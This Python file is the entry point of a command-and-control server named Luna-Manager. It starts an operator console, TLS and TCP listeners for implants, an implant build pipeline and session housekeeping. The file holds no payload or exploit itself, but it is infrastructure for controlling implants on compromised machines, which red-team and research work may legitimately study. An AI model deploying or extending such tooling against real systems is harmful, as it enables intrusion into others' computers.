"""Luna-Manager entry point.

Brings up three listeners, the operator API, the build pipeline, and the
housekeeping thread, then blocks until interrupted.

    python -m c2.main

Configuration is environment driven so it drops straight into a container:

    LUNA_DATA          data directory (sqlite db, certs, build artifacts)
    LUNA_DSN           postgresql://... or sqlite://...
    LUNA_HOST          bind address, default 0.0.0.0
    LUNA_CONSOLE_PORT  plain HTTP console, default 8080
    LUNA_HTTPS_PORT    TLS implant listener, default 8443
    LUNA_TCP_PORT      raw TCP implant listener, default 9443
    LUNA_OPERATOR      operator username, default admin
    LUNA_PASSWORD      operator password, generated if unset
    LUNA_REG_KEY       legacy shared registration key (hex), optional
    LUNA_INSECURE      "1" disables TLS on the implant listener
"""

from __future__ import annotations

import argparse
import os
import signal
import sys
import threading
import time

from .api import OperatorAPI
from .builder import Builder
from .core import SessionRegistry
from .http_server import make_server, serve_forever_in_thread
from .store import expire_stale_tasks, open_store
from .tcp_listener import TCPListener
from .tls import ensure_cert, fingerprint

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)


def _secret(data_dir: str) -> bytes:
    path = os.path.join(data_dir, "operator.secret")
    if os.path.exists(path):
        with open(path, "rb") as fh:
            return fh.read()
    raw = os.urandom(32)
    os.makedirs(data_dir, exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(raw)
    os.chmod(path, 0o600)
    return raw


def reap_loop(registry: SessionRegistry, store) -> None:
    while True:
        time.sleep(60)
        try:
            dropped = registry.reap(idle_after=900.0)
            expired = expire_stale_tasks(store, older_than=900)
            if dropped or expired:
                store.log_event(
                    "housekeeping",
                    f"reaped {dropped} sessions, expired {expired} tasks",
                )
        except Exception as exc:  # noqa: BLE001
            print(f"[luna] housekeeping error: {exc}", file=sys.stderr)


def main() -> int:
    parser = argparse.ArgumentParser(prog="luna", add_help=True)
    parser.add_argument("--host", default=os.environ.get("LUNA_HOST", "0.0.0.0"))
    parser.add_argument(
        "--console-port", type=int, default=int(os.environ.get("LUNA_CONSOLE_PORT", 8080))
    )
    parser.add_argument(
        "--https-port", type=int, default=int(os.environ.get("LUNA_HTTPS_PORT", 8443))
    )
    parser.add_argument(
        "--tcp-port", type=int, default=int(os.environ.get("LUNA_TCP_PORT", 9443))
    )
    parser.add_argument("--data", default=os.environ.get("LUNA_DATA", os.path.join(REPO, "var")))
    parser.add_argument("--dsn", default=os.environ.get("LUNA_DSN", ""))
    parser.add_argument("--rotate-cert", action="store_true")
    args = parser.parse_args()

    data_dir = os.path.abspath(args.data)
    os.makedirs(data_dir, exist_ok=True)

    dsn = args.dsn or os.environ.get("LUNA_DSN") or f"sqlite://{os.path.join(data_dir, 'luna.db')}"
    store = open_store(dsn)

    cert_dir = os.path.join(data_dir, "tls")
    if args.rotate_cert:
        for name in ("listener.crt.pem", "listener.key.pem"):
            path = os.path.join(cert_dir, name)
            if os.path.exists(path):
                os.unlink(path)
    cert_path, key_path = ensure_cert(cert_dir)
    cert_fp = fingerprint(cert_path)

    reg_key = bytes.fromhex(os.environ.get("LUNA_REG_KEY", "")) if os.environ.get("LUNA_REG_KEY") else b""

    registry = SessionRegistry(store, reg_key)
    builder = Builder(
        store=store,
        source_root=os.path.join(REPO, "implant", "src"),
        output_root=os.path.join(data_dir, "builds"),
        template_path=os.path.join(REPO, "implant", "config", "luna_config.hpp.in"),
        cert_fingerprint=cert_fp,
    )
    api = OperatorAPI(store, registry, builder, _secret(data_dir))

    context = {"api": api, "registry": registry, "quiet": True}

    console = make_server(args.host, args.console_port, context)
    serve_forever_in_thread(console, "luna-console")

    insecure = os.environ.get("LUNA_INSECURE") == "1"
    https = make_server(
        args.host,
        args.https_port,
        context,
        tls=None if insecure else (cert_path, key_path),
    )
    serve_forever_in_thread(https, "luna-https")

    tcp = TCPListener(args.host, args.tcp_port, registry, store)
    tcp.start()

    threading.Thread(target=reap_loop, args=(registry, store), daemon=True).start()

    scheme = "http" if insecure else "https"
    print("=" * 68)
    print(" Luna-Manager")
    print(f"  console     http://{args.host}:{args.console_port}/")
    print(f"  implant     {scheme}://{args.host}:{args.https_port}/v1/")
    print(f"  tcp         tcp://{args.host}:{args.tcp_port}")
    print(f"  database    {dsn}")
    print(f"  cert sha256 {cert_fp}")
    print(f"  operator    {os.environ.get('LUNA_OPERATOR', 'admin')}")
    print("=" * 68)

    stop = threading.Event()

    def _shutdown(*_: object) -> None:
        stop.set()

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    while not stop.is_set():
        stop.wait(1.0)

    print("[luna] shutting down")
    tcp.stop()
    console.shutdown()
    https.shutdown()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
